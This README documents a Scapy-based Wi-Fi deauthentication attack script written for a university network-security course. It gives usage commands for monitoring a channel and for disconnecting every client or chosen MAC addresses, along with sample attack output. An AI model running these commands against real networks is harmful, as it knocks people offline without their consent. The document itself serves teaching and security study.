# WiFi-Deauth
Wi-Fi Deauthentication Attack using [Scapy](https://scapy.net/)

## Usage
Script parameters

```
thanos@briki:~/$ ./deauth.py -h
Usage: sudo ./deauth.py [ARGUMENTS]...

Optional arguments.
  -v                         Run in verbose mode.
  -h, --help                 Prints this message.
  -c, --channel              Channel to monitor.
  -a, --attack               Victim's MAC address.

Example usage
  Monitor channel 8 for victims:
    sudo ./deauth.py -c 8
  Attack all clients on channel 8:
    sudo ./deauth.py -c 8 -a *
  Attack clients by MAC on channel 8:
    sudo ./deauth.py -c 8 -a AA:11:22:33:44:55 -a BB:11:22:33:44:55

By GramThanos
```

Monitor mode on channel 8

```
thanos@briki:~/$ sudo ./deauth.py -c 8
[ATK][INFO] Loading vendor list from cache
[ATK][INFO] Vendor list successfully loaded: 27663 entries
[ATK][INFO] Interface "wlp3s0" selected
[ATK][INFO] Channel was set to 8
[ATK][INFO] Detected AP     : "Thanos" - YY:YY:YY:YY:YY:YY [TP-LINK TECHNOLOGIES CO.,LTD.]
[ATK][INFO] Detected victim : XX:XX:XX:XX:XX:XX [Raspberry Pi Foundation]
[ATK][INFO] Detected victim : XX:XX:XX:XX:XX:XX [Xiaomi Communications Co Ltd]
[ATK][INFO] Detected victim : XX:XX:XX:XX:XX:XX [Raspberry Pi Foundation]
[ATK][INFO] Detected victim : XX:XX:XX:XX:XX:XX [Apple, Inc.]
[ATK][INFO] Detected victim : XX:XX:XX:XX:XX:XX [Xiaomi Communications Co Ltd]
^C
```

Attack victim device with MAC address "XX:XX:XX:XX:XX:XX" on channel 8

```
thanos@briki:~/$ sudo ./deauth.py -c 8 -a XX:XX:XX:XX:XX:XX
[ATK][INFO] Loading vendor list from cache
[ATK][INFO] Vendor list successfully loaded: 27663 entries
[ATK][INFO] Interface "wlp3s0" selected
[ATK][INFO] Channel was set to 8
[ATK][INFO] Detected AP : "Thanos" - YY:YY:YY:YY:YY:YY [TP-LINK TECHNOLOGIES CO.,LTD.]
[ATK][INFO] Deauth      : [1] XX:XX:XX:XX:XX:XX [Xiaomi Communications Co Ltd]
[ATK][INFO] Deauth      : [2] XX:XX:XX:XX:XX:XX [Xiaomi Communications Co Ltd]
[ATK][INFO] Deauth      : [3] XX:XX:XX:XX:XX:XX [Xiaomi Communications Co Ltd]
[ATK][INFO] Deauth      : [4] XX:XX:XX:XX:XX:XX [Xiaomi Communications Co Ltd]
[ATK][INFO] Deauth      : [5] XX:XX:XX:XX:XX:XX [Xiaomi Communications Co Ltd]
[ATK][INFO] Deauth      : [6] XX:XX:XX:XX:XX:XX [Xiaomi Communications Co Ltd]
[ATK][INFO] Deauth      : [7] XX:XX:XX:XX:XX:XX [Xiaomi Communications Co Ltd]
[ATK][INFO] Deauth      : [8] XX:XX:XX:XX:XX:XX [Xiaomi Communications Co Ltd]
^C
```

## Install Dependancies
The script was created for python3.

You will need pip
```sh
sudo apt install python3-pip
```

Install [Scapy](https://scapy.net/)
```sh
sudo pip3 install scapy
```
Install [mac-vendor-lookup](https://pypi.org/project/mac-vendor-lookup/)
```sh
sudo pip3 install mac-vendor-lookup
```

## About
This script was created for use in an exercise of the course Mobile Network Security (2019-2020) at University of Piraeus.
